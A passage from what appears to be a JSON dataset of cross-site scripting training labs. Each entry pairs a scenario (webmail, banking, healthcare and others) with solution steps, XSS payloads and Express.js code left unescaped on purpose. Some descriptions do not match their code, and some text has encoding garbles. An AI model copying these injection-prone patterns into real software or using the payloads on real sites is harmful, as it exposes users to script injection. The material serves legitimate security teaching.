    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let announcements = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/announcements', (req, res) => { const list = announcements.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body><h1>Announcements</h1>${list}</body></html>`); }); app.post('/admin/announce', (req, res) => { announcements.push(req.body.content); res.redirect('/announcements'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Webmail XSS in Subject Preview Tooltip",
    "Lab Description": "A webmail client shows incoming emails with subject preview tooltips. The subject is stored and directly reflected inside a tooltip using an HTML attribute without proper encoding. To solve: Inject an XSS payload in the email subject that executes JavaScript when the tooltip renders.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a crafted email to yourself with an XSS payload in the subject.",
      "Login and view the inbox.",
      "Hover over the subject line to trigger the tooltip.",
      "Observe script execution due to unescaped attribute context."
    ],
    "payloads": [
      "\" onmouseover=alert(1) x=\"",
      "' onmouseenter=alert(1) x='",
      "` onfocus=alert(1) x=`"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/inbox', (req, res) => { const list = messages.map(m => `<li title=\"${m.subject}\">${m.from}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.post('/send', (req, res) => { messages.push({ from: req.body.from, subject: req.body.subject }); res.redirect('/inbox'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in QR Code Generator Text Field",
    "Lab Description": "An online QR generator embeds the text input directly into a JavaScript function to generate the code. It fails to escape special characters in the input. To solve: Inject a payload that breaks out of the JS string and executes a script when generating the QR code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to the QR code generation page.",
      "Enter a crafted payload into the text field.",
      "Click 'Generate' to trigger the script.",
      "Observe the vulnerable inline JS executing your payload."
    ],
    "payloads": [
      "';alert(1);//",
      "`;alert(1)//",
      "\");alert(1);//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.use(express.urlencoded({ extended: true })); app.get('/qr', (req, res) => { const data = req.query.data || ''; res.send(`<html><body><script>generateQR(\"${data}\");</script></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS via URL Metadata Preview in Bookmark Manager",
    "Lab Description": "The app lets users save URLs and fetches a metadata preview using Open Graph scraping. However, the meta description is injected directly into the page without sanitization. To solve: Host a URL with malicious meta content and save it to the app.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a webpage with a crafted meta description containing an XSS payload.",
      "Add this link to the bookmark manager.",
      "Preview the bookmark and trigger the payload.",
      "Confirm that script executes from injected meta content."
    ],
    "payloads": [
      "<meta name=description content=\"<img src=x onerror=alert(1)>\">",
      "<meta property=og:description content=\"<svg/onload=alert(1)>\">"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const axios = require('axios'); const cheerio = require('cheerio'); const app = express(); const bookmarks = []; app.use(express.urlencoded({ extended: true })); app.post('/add', async (req, res) => { const url = req.body.url; const resp = await axios.get(url); const $ = cheerio.load(resp.data); const desc = $('meta[name=description]').attr('content') || ''; bookmarks.push({ url, desc }); res.redirect('/bookmarks'); }); app.get('/bookmarks', (req, res) => { const list = bookmarks.map(b => `<li>${b.url} - ${b.desc}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Dynamic Poll Result Label",
    "Lab Description": "A polling application shows poll results where labels are user-generated. These labels are rendered inside the DOM using innerHTML in a script block, leading to DOM-based XSS. To solve: Inject malicious HTML as a label to execute script when viewing results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a new poll with a crafted label containing an XSS payload.",
      "Submit the poll and view the results.",
      "Observe script execution due to unsafe innerHTML usage."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const polls = []; app.use(express.urlencoded({ extended: true })); app.post('/create', (req, res) => { polls.push({ label: req.body.label }); res.redirect('/results'); }); app.get('/results', (req, res) => { const labels = polls.map(p => `<li>${p.label}</li>`).join(''); res.send(`<html><body><ul>${labels}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in E-Commerce Product Comparison Table",
    "Lab Description": "The platform allows users to compare products and attach notes to each item. These notes are reflected in a table and injected using raw HTML. No sanitization is done on note content. To solve: Inject a note that executes JavaScript when the table loads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add a product to the comparison list.",
      "Attach a malicious note to the item.",
      "Load the comparison table and verify script execution."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const items = []; app.use(express.urlencoded({ extended: true })); app.post('/compare', (req, res) => { items.push({ name: req.body.name, note: req.body.note }); res.redirect('/table'); }); app.get('/table', (req, res) => { const rows = items.map(i => `<tr><td>${i.name}</td><td>${i.note}</td></tr>`).join(''); res.send(`<html><body><table>${rows}</table></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Banking Portal Stored XSS in Internal Messaging System",
    "Lab Description": "A banking web application includes a secure internal messaging feature for communication between users and bank staff. The message content is rendered using `innerHTML` without sanitization, allowing stored XSS. To solve: Inject a message with a payload and trigger it by visiting the inbox.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as a user and navigate to the messaging system.",
      "Send a message containing an XSS payload.",
      "Log out and log in as the receiving user.",
      "Access the inbox and trigger script execution.",
      "Observe stored payload execution in the context of the victim."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(`XSS`)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'xsslab', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.send('<form method=POST><input name=user><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.user; res.redirect('/inbox'); }); app.get('/send', (req, res) => { if (!req.session.user) return res.redirect('/login'); res.send('<form method=POST><input name=to><textarea name=body></textarea><button>Send</button></form>'); }); app.post('/send', (req, res) => { if (!req.session.user) return res.redirect('/login'); messages.push({ to: req.body.to, body: req.body.body }); res.redirect('/inbox'); }); app.get('/inbox', (req, res) => { if (!req.session.user) return res.redirect('/login'); let inbox = messages.filter(m => m.to === req.session.user); let html = '<h1>Inbox</h1><ul>'; inbox.forEach(m => { html += `<li>${m.body}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
  },
  {
    "Lab scenario": "E-commerce XSS in Wishlist Notes Feature",
    "Lab Description": "An e-commerce site allows users to attach notes to wishlist items. The notes are reflected using innerHTML when viewing the wishlist. Due to missing sanitization, this leads to reflected XSS. To solve: Inject a crafted payload into the note and revisit the wishlist.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add an item to the wishlist.",
      "Attach a note to the item with an XSS payload.",
      "Revisit the wishlist page.",
      "Trigger the payload when the note is rendered.",
      "Verify that the script executes."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); let wishlist = {}; app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'xss', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.send('<form method=POST><input name=user><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.user; wishlist[req.session.user] = []; res.redirect('/wishlist'); }); app.get('/wishlist', (req, res) => { if (!req.session.user) return res.redirect('/login'); let items = wishlist[req.session.user]; let html = '<form method=POST><input name=item><input name=note><button>Add</button></form><ul>'; items.forEach(entry => { html += `<li>${entry.item} - ${entry.note}</li>`; }); html += '</ul>'; res.send(html); }); app.post('/wishlist', (req, res) => { if (!req.session.user) return res.redirect('/login'); wishlist[req.session.user].push({ item: req.body.item, note: req.body.note }); res.redirect('/wishlist'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Project Management Tool XSS in Task Description",
    "Lab Description": "A project management tool allows users to describe tasks with detailed HTML content. Task descriptions are rendered without sanitization in the dashboard. To solve: Create a task with a malicious description that triggers XSS when viewed.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in and create a new task.",
      "Insert an XSS payload in the task description field.",
      "Save the task and navigate to the dashboard.",
      "Observe the payload executing within the dashboard.",
      "Confirm script execution in user context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/create', (req, res) => { res.send('<form method=POST><input name=title><textarea name=desc></textarea><button>Create</button></form>'); }); app.post('/create', (req, res) => { tasks.push({ title: req.body.title, desc: req.body.desc }); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { let html = '<h1>Tasks</h1><ul>'; tasks.forEach(t => { html += `<li>${t.title}: ${t.desc}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Healthcare Portal Reflected XSS in Appointment Notes",
    "Lab Description": "A healthcare scheduling portal allows patients to add optional notes when booking appointments. These notes are echoed in the confirmation screen without encoding. This leads to reflected XSS. To solve: Inject a crafted payload in the notes field and reach the confirmation page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the appointment booking form.",
      "Enter a malicious payload in the notes field.",
      "Submit the form and proceed to the confirmation page.",
      "Observe the reflected content in the response.",
      "Confirm payload execution in the browser."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert('XSS')>",
      "<svg/onload=alert(`XSS`)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { res.send('<form method=POST><input name=name><input name=date><input name=note><button>Book</button></form>'); }); app.post('/book', (req, res) => { res.send(`<h1>Booking Confirmed</h1><p>${req.body.name} on ${req.body.date}</p><p>Note: ${req.body.note}</p>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Learning Management System XSS in Forum Post Preview",
    "Lab Description": "A learning platform includes a forum where users can preview their posts before submitting. The preview feature renders HTML from user input using innerHTML. There\u00e2\u20ac\u2122s no output encoding, leading to reflected XSS. To solve: Inject an XSS payload in a forum post preview and confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the forum and click 'New Post'.",
      "Enter an XSS payload in the content field.",
      "Click 'Preview'.",
      "The payload is rendered in real-time using innerHTML.",
      "Observe script execution in the preview section."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert('XSS')>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/forum', (req, res) => { res.send('<form method=POST action=/preview><textarea name=content></textarea><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { res.send(`<h1>Preview</h1><div>${req.body.content}</div>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Job Application Portal Reflected XSS in Search Suggestions",
    "Lab Description": "A job portal includes a search bar with live suggestions based on user input. The search term is reflected directly into the DOM using innerHTML without sanitization. This introduces DOM-based XSS. To solve: Inject a payload into the search query that executes when suggestions render.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit the job search page.",
      "Type a crafted payload into the search input.",
      "Observe how the search term is reflected in the suggestions list.",
      "Inspect how the script executes due to unsafe rendering.",
      "Confirm successful execution of payload in browser context."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Search</h1><ul id='results'></ul><script>document.getElementById('results').innerHTML = '<li>${q}</li>';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Travel Booking App XSS in Hotel Feedback Submission",
    "Lab Description": "Users of a travel booking app can submit feedback for hotels. Feedback comments are shown to future visitors. Since input is rendered without escaping, stored XSS is possible. To solve: Submit a malicious comment and confirm it executes when viewed.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to a hotel\u00e2\u20ac\u2122s feedback form.",
      "Submit a comment containing an XSS payload.",
      "Visit the hotel\u00e2\u20ac\u2122s page as a different user.",
      "View the feedback section to trigger the payload.",
      "Observe execution confirming stored XSS."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/hotel', (req, res) => { let out = '<form method=POST><textarea name=comment></textarea><button>Submit</button></form><ul>'; comments.forEach(c => { out += `<li>${c}</li>`; }); out += '</ul>'; res.send(out); }); app.post('/hotel', (req, res) => { comments.push(req.body.comment); res.redirect('/hotel'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Learning Dashboard XSS in Achievement Notification",
    "Lab Description": "A gamified e-learning dashboard shows pop-up notifications using dynamic HTML when users earn badges. Badge names are inserted directly into HTML via template strings without encoding. To solve: Inject a payload into a badge name and wait for the notification to appear.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger badge creation through activity (e.g. completing a course).",
      "Inject an XSS payload into the badge name input.",
      "Trigger the system to show achievement notifications.",
      "Observe the injected content executing in a script context.",
      "Confirm DOM-based XSS execution via alert."
    ],
    "payloads": [
      "<img src=1 onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badges = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/award', (req, res) => { res.send('<form method=POST><input name=name><button>Award</button></form>'); }); app.post('/award', (req, res) => { badges.push(req.body.name); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { let out = '<h1>Achievements</h1><ul>'; badges.forEach(b => { out += `<li><script>document.body.innerHTML += '<div>Badge earned: ${b}</div>'</script></li>`; }); out += '</ul>'; res.send(out); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Recipe Sharing Platform Reflected XSS in Title Preview",
    "Lab Description": "Users writing a new recipe can preview the recipe title before submission. The preview is done via client-side rendering using innerHTML with unescaped user input. This introduces reflected XSS. To solve: Inject a payload into the title field and preview the recipe.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the 'Create Recipe' page.",
      "Enter a malicious string in the title field.",
      "Click preview to trigger the reflection.",
      "Observe script execution in the preview area.",
      "Confirm the payload executes as part of DOM rendering."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/create', (req, res) => { res.send('<form method=POST action=/preview><input name=title><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { res.send(`<div>Preview: <span id=preview></span><script>document.getElementById('preview').innerHTML = '${req.body.title}'</script></div>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Online Survey Tool XSS in Response Review Panel",
    "Lab Description": "Survey results in this tool are shown in an admin panel where user-submitted answers are rendered as HTML. Lack of sanitization introduces a stored XSS vector. To solve: Inject a malicious answer and trigger it by viewing the admin review panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a survey response with a malicious answer.",
      "Log in as the survey creator or admin.",
      "Open the response review dashboard.",
      "Trigger the rendering of the malicious answer.",
      "Verify that the XSS payload executes in admin\u00e2\u20ac\u2122s context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let responses = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/survey', (req, res) => { res.send('<form method=POST><input name=answer><button>Submit</button></form>'); }); app.post('/survey', (req, res) => { responses.push(req.body.answer); res.redirect('/thankyou'); }); app.get('/admin', (req, res) => { let html = '<h1>Survey Responses</h1><ul>'; responses.forEach(r => { html += `<li>${r}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Fitness App Leaderboard XSS in Custom Username Field",
    "Lab Description": "Users can set a custom username which appears on the public leaderboard. The application renders usernames directly using innerHTML, creating a stored XSS vector. To solve: Inject a payload into the username and trigger its execution from the leaderboard page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a new account and set a malicious username.",
      "Access the leaderboard page where usernames are listed.",
      "Inspect how the username is rendered using innerHTML.",
      "Trigger the leaderboard view to display the payload.",
      "Verify XSS by observing execution of injected script."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let users = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=POST><input name=username><button>Register</button></form>'); }); app.post('/register', (req, res) => { users.push(req.body.username); res.redirect('/leaderboard'); }); app.get('/leaderboard', (req, res) => { let out = '<ul>'; users.forEach(u => { out += `<li>${u}</li>`; }); out += '</ul>'; res.send(out); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Education Platform XSS in Quiz Result Summary",
    "Lab Description": "After completing a quiz, users receive a result summary that includes their name and score. The summary page renders these details using template literals inside script tags, allowing DOM-based XSS via the name field. To solve: Inject a payload in the name field to execute a script upon result viewing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a quiz attempt with a malicious name value.",
      "Reach the summary page where the name is used in a script tag.",
      "Observe improper handling of user-controlled name value.",
      "Trigger payload rendering within the script block.",
      "Verify successful execution of the injected code."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "';alert(1);//",
      "\";alert(1);//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/quiz', (req, res) => { res.send('<form method=POST action=/summary><input name=name><button>Submit</button></form>'); }); app.post('/summary', (req, res) => { const name = req.body.name; res.send(`<html><head><script>let result = 'Student: ${name}'; document.title = result;</script></head><body><h1>Quiz Summary</h1></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Customer Support Ticketing XSS in Ticket Notes Viewer",
    "Lab Description": "Support agents can view user-submitted ticket notes in the admin dashboard. The application renders notes directly into the DOM using dangerouslySetInnerHTML in a templated admin UI. This leads to stored XSS. To solve: Submit a malicious note and verify execution upon admin view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a support ticket with a malicious note.",
      "Log in as a support agent and access the ticket viewer.",
      "Observe the note being rendered unsafely in HTML.",
      "Trigger payload execution when the admin views the ticket.",
      "Verify that the malicious script executes in admin's context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tickets = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit', (req, res) => { res.send('<form method=POST><textarea name=note></textarea><button>Send</button></form>'); }); app.post('/submit', (req, res) => { tickets.push(req.body.note); res.redirect('/thankyou'); }); app.get('/admin/tickets', (req, res) => { let html = '<h1>Tickets</h1><ul>'; tickets.forEach(t => { html += `<li>${t}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Project Management Tool XSS in Task Title Preview Modal",
    "Lab Description": "A project management tool provides a modal preview for task titles. User input is passed directly into innerHTML within the modal. Lack of sanitization introduces reflected XSS. To solve: Inject an XSS payload into the task title field and preview it to trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the task creation form.",
      "Enter a task title with an XSS payload.",
      "Click the 'Preview' button to open the modal.",
      "Inspect how input is rendered inside the modal using innerHTML.",
      "Verify the script executes within the modal context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/task', (req, res) => { res.send('<form method=POST action=/preview><input name=title><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { const title = req.body.title; res.send(`<div id=modal></div><script>document.getElementById('modal').innerHTML = '<h2>${title}</h2>';</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Bookstore Review Section Stored XSS via Star Rating Comments",
    "Lab Description": "A review section in a bookstore web app allows users to leave comments with star ratings. These are rendered without escaping, introducing stored XSS. To solve: Submit a crafted review that triggers script execution when other users view it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open a book page and submit a review with a payload.",
      "Include the payload in the comment field.",
      "Visit the book page again as another user.",
      "Observe the review section and detect the triggered payload.",
      "Verify execution of malicious content."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { let html = '<form method=POST><input name=comment><button>Post</button></form><ul>'; reviews.forEach(r => { html += `<li>${r}</li>`; }); html += '</ul>'; res.send(html); }); app.post('/book', (req, res) => { reviews.push(req.body.comment); res.redirect('/book'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Content Collaboration XSS in Markdown Preview Panel",
    "Lab Description": "The collaboration platform provides a live Markdown preview panel. The application fails to sanitize embedded HTML within Markdown content and renders it directly inside an iframe. This opens up the possibility of script injection via raw HTML. To solve: Inject a script payload wrapped in Markdown and verify execution inside the preview pane.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login and navigate to the content creation area with Markdown support.",
      "Write a Markdown post that includes raw HTML like <script> tags.",
      "Observe how the preview pane renders this content in real-time.",
      "Craft a script payload using valid HTML/Markdown combinations.",
      "Trigger the XSS in the preview iframe."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const marked = require('marked'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/editor', (req, res) => { res.send('<form method=\"POST\" action=\"/preview\"><textarea name=\"markdown\"></textarea><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { const markdown = req.body.markdown; const html = marked(markdown); res.send(`<iframe srcdoc='${html}'></iframe>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Order Tracking XSS via Invoice ID in Print Preview",
    "Lab Description": "The order tracking system allows users to view a print-friendly version of their invoices. The invoice ID is reflected without encoding inside the HTML title and print header. To solve: Inject a payload into the invoice ID parameter and trigger script execution on the print preview page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to the invoice print preview feature using a valid invoice ID.",
      "Modify the ID parameter using a reflected XSS payload.",
      "Observe that the payload appears in the HTML title or inline print content.",
      "Craft payloads that work within HTML attributes or text nodes.",
      "Trigger XSS on the preview page."
    ],
    "payloads": [
      "\"><script>alert('XSS')</script>",
      "'><img src=x onerror=alert(1)>",
      "\"><svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/print', (req, res) => { const id = req.query.id || '000'; res.send(`<html><head><title>Invoice ${id}</title></head><body><h2>Invoice #${id}</h2></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Social Sharing Metadata Injection",
    "Lab Description": "The blogging platform generates dynamic Open Graph and Twitter meta tags for each post based on user-defined titles and summaries. These values are not properly escaped, resulting in XSS when malicious scripts are injected via post titles. To solve: Inject an XSS payload into a new post title and visit its social sharing preview page.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Create a new blog post with a title containing a script payload.",
      "Publish the post and open the sharing metadata preview endpoint.",
      "Inspect the generated meta tags using browser DevTools.",
      "Identify improper escaping in meta attributes.",
      "Confirm XSS when rendering preview in social embed iframe."
    ],
    "payloads": [
      "\"><script>alert(document.domain)</script>",
      "' onerror='alert(1)",
      "\"><img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const posts = []; app.post('/new-post', (req, res) => { posts.push({ title: req.body.title }); res.redirect(`/preview-meta?index=${posts.length - 1}`); }); app.get('/preview-meta', (req, res) => { const post = posts[req.query.index]; res.send(`<html><head><meta property=\"og:title\" content=\"${post.title}\"><meta name=\"twitter:title\" content=\"${post.title}\"></head><body>Preview</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Shopping Cart Notes on Order Confirmation Page",
    "Lab Description": "The e-commerce platform allows customers to leave 'special notes' in their cart before checkout. These notes are injected into the order confirmation page without sanitization. To solve: Inject a malicious payload in the note field, complete the order, and trigger script execution on the confirmation page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add any product to the cart and proceed to checkout.",
      "Insert a malicious XSS payload in the 'order notes' field.",
      "Place the order and observe the order confirmation page.",
      "Inspect where the note appears and test for script execution.",
      "Verify successful payload delivery."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let lastNote = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/checkout', (req, res) => { res.send('<form action=\"/confirm\" method=\"POST\"><input name=\"note\" placeholder=\"Special instructions\"><button>Order</button></form>'); }); app.post('/confirm', (req, res) => { lastNote = req.body.note; res.redirect('/confirmation'); }); app.get('/confirmation', (req, res) => { res.send(`<html><body><h1>Order Confirmed</h1><p>Note: ${lastNote}</p></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Project Tag Input in Task Management App",
    "Lab Description": "A task management tool supports project-specific tags entered by users. These tags are displayed as interactive HTML elements but are not encoded before being rendered. To solve: Create a tag with embedded JavaScript and verify execution when the tag list is displayed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login and navigate to the project settings page.",
      "Create a tag with an XSS payload in the name.",
      "View the task list page where tags are listed.",
      "Identify the unsanitized output in the tag container.",
      "Confirm successful script execution."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('Tag XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tags = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/tags', (req, res) => { const list = tags.map(t => `<span>${t}</span>`).join(' '); res.send(`<html><body><div>${list}</div></body></html>`); }); app.post('/add-tag', (req, res) => { tags.push(req.body.name); res.redirect('/tags'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Feedback Subject in Support Portal Email Preview",
    "Lab Description": "A support portal allows users to submit feedback with a subject line that is shown in the email preview pane. The subject is not sanitized and is inserted inside the HTML body of the preview. To solve: Inject a payload in the subject field, then view the email preview as support staff and trigger script execution.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Access the feedback form on the support page.",
      "Submit feedback with a malicious payload in the subject.",
      "Login as staff and view the email preview feature.",
      "Observe the vulnerable injection point in the preview template.",
      "Trigger the XSS payload execution."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "\"><img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
